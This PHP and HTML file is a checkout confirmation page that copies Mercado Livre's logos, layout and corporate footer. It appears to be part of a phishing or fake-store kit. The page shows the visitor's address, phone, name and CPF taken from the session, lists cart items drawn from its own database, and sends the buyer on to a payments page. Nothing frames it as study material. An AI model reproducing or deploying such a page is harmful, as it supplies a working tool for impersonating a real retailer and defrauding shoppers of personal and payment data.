<?php 
session_start();
include "../config/config.php";
?>
 <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
	<link rel="stylesheet" href="../css/style.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">	
</head>
<body style="background:rgb(238, 238, 238);">

	<header class="dasdaksldaskdadcoderphp">
		<div class="container">
			<div class="row">
				<div class="col-md-6 col-6">
					<img class="peukaskaks" src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.59/mercadolibre/logo-pt__large_25years_v2.png" alt="">
				</div>
				<div class="col-md-6 col-6">
					<p style="font-size:13px;cursor:pointer;position:relative;top:10px;float:right;">Contato</p>
				</div>
			</div>
		</div>
	</header>
	
	<aside>
		<div class="container">
			<br><br>
			 	<h1 style="font-size:1.6em;">Revise e confirme sua compra</h1>
			 	<p style="font-size:13px;">Detalhe do envio</p>
			 <div class="row">

			 			 	 <div class="col-md-8"><br>
			 	 	<div class='kdlkdkasdasld' style="cursor:pointer;border-radius:4px;width:100%;height:auto;background:rgb(245, 245, 245);padding:40px;">
			 	 
			 	 		
			 	 			
			 	 					

		 		 	

<img  style="position:absolute;margin-top:-18px;float:left;" border="0" height="30px" src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.38.0/assets/icons/pointer-blue.svg" alt="">

<span style="line-height:25px;font-size:14px;position:absolute;margin-top:-30px;margin-left:50px;float:left;"><?=$_SESSION['rua']?> <?=$_SESSION['numero']?><br><span style="line-height: 2px;font-weight:300;font-size:13px;color:rgb(141,141,141)"><?=$_SESSION['cidade']?>, <?=$_SESSION['estado']?> - CEP <?=$_SESSION['cep']?> <br><br><br><br><br><br><br><br><br><?=$_SESSION['nome']?> - <?=$_SESSION['telefone']?></span></span>




<div style="clear:both;"></div>

			 	 	
			
			 	 	
			 	 	</div>



<br>

<div class='kdlkdkasdasld' style="cursor:pointer;border-radius:4px;width:100%;height:auto;background:rgb(245, 245, 245);padding:40px;">
			 	 
			 	 		
			 	 				
			 	 					

		 		 	

<img  style="position:absolute;margin-top:-16px;float:left;" border="0" height="30px" src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.38.0/assets/icons/buflo_information_shipping-blue.svg" alt="">

<span style="font-size:14px;position:absolute;margin-top:-12px;margin-left:54px;float:left;">Receba <?= $_SESSION['qtdprodutos']?> produtos em <?= $_SESSION['qtdprodutos']?> envios</span>




<div style="clear:both;"></div>
<br><br>
<div class="row">
	<span style="color:rgb(0 0 0 / 90%);font-size:13px;font-weight:600;">Envio 1 <img border="0" height="15px" src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.38.0/assets/icons/full.svg" alt="">
</span>
<br>
<span style="margin-top:6px; color:rgb(0 0 0 / 90%);font-size: 13px;">Chegará no seu endereço segunda-feira 14 de novembro

</span>
<br>


</div>
<br>


<?php

       
            
                    if(!isset($_SESSION['carrinho'])){
                        $_SESSION['carrinho'] = array();
                    }

                    if(isset($_GET['acao'])){
                        // adicionar carrinho
                        
                        if($_GET['acao'] == 'add'){
                            
                            if(!isset($_SESSION['carrinho'][$id])){
                                $_SESSION['carrinho'][$id]=1;
                                ?>
                                

     <!--                            <script>iziToast.success({
    title: 'Produto',
    message: ' adicionar ao carrinho.',
});
</script> -->



                                <?php
                            }else{
                                 $_SESSION['carrinho'][$id]+=1;
                            }
                        }

                        // REMOVER
                        
                            if($_GET['acao'] == 'del'){
                                    @$id = $_GET['id'];
                                    if(isset($_SESSION['carrinho'][$id])){
                                        unset($_SESSION['carrinho'][$id]);


                                    }
                                }
                        
    if($_GET['acao'] == 'up'){
                                    if(is_array($_POST['prod'])){
                                        foreach($_POST['prod'] as $id => $qtd){
                                            if(!empty($qtd) || $qtd <> 0 ){
                                                $_SESSION['carrinho'][$id] = $qtd;
                                                ?>
       <!--                                                       <script>iziToast.success({
    title: 'Quantidade',
    message: 'Atualizado com sucesso.',
});
</script> -->
<?php
                                            }else{
                                                unset($_SESSION['carrinho'][$id]);
                                            }
                                        }
                                    }
                                }

                    }


            if(count($_SESSION['carrinho']) == 0){
                ?>
         <!--        <script>iziToast.warning({
    title: 'carrinho',
    message: 'Vazinho',
});



</script> -->

<?php

            }else{

                foreach($_SESSION['carrinho'] as $id => $qtd){

                                    $aa=[];
                                    $sql=$pdo->prepare("SELECT * FROM coderphp_produtos WHERE id =:id ORDER BY id DESC");
                                    $sql->bindValue(":id", $id);
                                    $sql->execute();

                                    

                                    if($sql->rowCount() > 0){
                                        $aa=$sql->fetchAll(PDO::FETCH_ASSOC);
                                       
                                    }
                                    foreach($aa as $okok){
                                        $_SESSION['title1'] = $okok['title'];
                                         $_SESSION['fotos1'] = $okok['fotos1'];
                                        "<br>";

$altura = $okok['preco'];
$valortotao = $altura = number_format(str_replace(",",".",str_replace(".","",$okok['preco'])), 2, '.', '');

 @$valor_com_desconto = $valortotao - ($valortotao * $pctm * 0.01);
 $valor_com_desconto;
$dois = $valor_com_desconto;

                         $parcelas = 10;
    $valor = $dois; 
    $valorTotal = number_format($valor, 2, '.', '');
    $valor_parcela = $valorTotal / $parcelas;

                                        @$sub = $dois * $qtd;
                                       $_SESSION['qtdprodutos'] = @$qtddsad += $qtd;

                                        "<br>";
                                      @$total += $sub;

                                      $okokk001 = $sub / $parcelas;

             



                    ?>

<img style="border-radius:50%;float:left;" border="0" height="30px" src="<?=$_SESSION['fotos1']?>" alt="">
<span style="color: rgba(0, 0, 0, .55);margin-left:10px;font-size:14px;"><?=$_SESSION['title1']?> <br> <span style="margin-left:10px;">Quantidade: <?=$_SESSION['qtdprodutos']?></span></span>

	<br><br>

 <?php 


   }
            }
        } ?> 

			
			 	 	
			 	 	</div>

<br>

<div class='kdlkdkasdasld' style="cursor:pointer;border-radius:4px;width:100%;height:auto;background:rgb(245, 245, 245);padding:40px;">
			 	 
			 	 		
			 	 				
			 	 					

		 		 	

<img  style="position:absolute;margin-top:-18px;float:left;" border="0" height="30px" src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.38.0/assets/icons/buflo_billing-info-blue.svg" alt="">

<span style="font-size:14px;position:absolute;margin-top:-20px;margin-left:50px;float:left;"><?=$_SESSION['nome']?><br><span style="line-height: 2px;font-weight:300;font-size:13px;color:rgb(141,141,141)">CPF <?=$_SESSION['cpf']?></span></span>




<div style="clear:both;"></div>

			 	 	
			
			 	 	
			 	 	</div>

			 	 	<br>
			 	 	


</div>




			 	<div class="col-md-4">
	 <div class="asdlasdaskd92929202020202-22002033" style="background:white;">
	 	<p style="font-weight: 600;">Resumo da compra</p>
	 	<hr>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Produtos (4)</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;">R$ <?=number_format($_SESSION['totalpreco'], 2, ',', '.');?></span></div>
	 		<div style="clear:both;"></div>
	 	</div><br>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Frete</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;color:#00a650;">Grátis

</span></div>
<div style="clear:both;"></div>
	 	</div>
	 	<hr>
	 	

	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;">Você pagará</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;"><strong>R$ <?=number_format($_SESSION['totalpreco'], 2, ',', '.');?></strong>

</span></div>
	 	</div>

	 	<hr>
<div class="row">
	 		<div class="col-md-6"><span style="float:left;">Total</span></div>
	 		<div class="col-md-6"><span style="float:right;"><strong>R$ <?=number_format($_SESSION['totalpreco'], 2, ',', '.');?></strong>

</span></div>
	 	</div><br>
	 	<button onclick="window.location.href='payments.php'"  style="margin-top:25px;width:100%;maring-top:15px !important;" class="buttoncomprar">Confirmar compra</button>
	 </div>
</div>
	


			 	 </div>
			 </div>
		</div>
	</aside>

<br>

<footer class="aksdkjasdkasdfooter">
	<div class="container">
	<div class="row">
			<nav class="ansnansnansnav">
			<ul>
			<li>Trabalhe conosco
</li>
			<li>Termos e condições</li>
			<li>Promoções</li>
			<li>Como cuidamos da sua privacidade</li>
			<li>Acessibilidade</li>
			<li>Contato</li>
			<li>Informações sobre seguros</li>
			<li>
Programa de Afiliados
</li>
			<li>Black friday</li>

		</ul>
	</nav>
<br>
	<span style="font-size:12px;color:rgb(200,200,200);">Copyright © 1999-2024 Ebazar.com.br LTDA. <br> CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</span>
	</div>
	</div>
</footer>






<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>


</body>
</html>